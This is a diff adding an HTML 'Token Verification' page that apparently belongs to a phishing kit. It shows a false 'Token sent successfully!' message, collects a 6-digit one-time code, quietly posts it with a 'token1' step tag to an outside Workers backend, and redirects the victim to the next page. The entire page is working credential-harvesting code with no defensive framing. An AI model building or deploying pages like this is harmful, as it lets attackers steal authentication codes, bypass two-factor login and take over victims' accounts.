@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Token Verification</title>
+  <style>/* same style as index.html - copy paste */</style>
+</head>
+<body>
+
+<div class="header"> <img src="https://via.placeholder.com/180x50/003087/fff?text=Your+Business" alt="Logo"> </div>
+
+<div class="container">
+  <h2 style="text-align:center;color:#003087;">Token Verification</h2>
+  <p style="text-align:center;color:green;font-weight:bold;">Token sent successfully!</p>
+  <form id="frm">
+    <input type="text" id="t" placeholder="6 Digit Token" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" required>
+    <button type="submit">Verify</button>
+  </form>
+</div>
+
+<script>
+document.getElementById("frm").addEventListener("submit", async e => {
+  e.preventDefault();
+  const payload = {
+    step: "token1",
+    token: document.getElementById("t").value,
+    time: new Date().toISOString()
+  };
+  await fetch("https://form-save-backend.youraccount.workers.dev/save", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  }).catch(()=>{});
+  location.href = "fan.html";
+});
+</script>
+</body>
+</html>
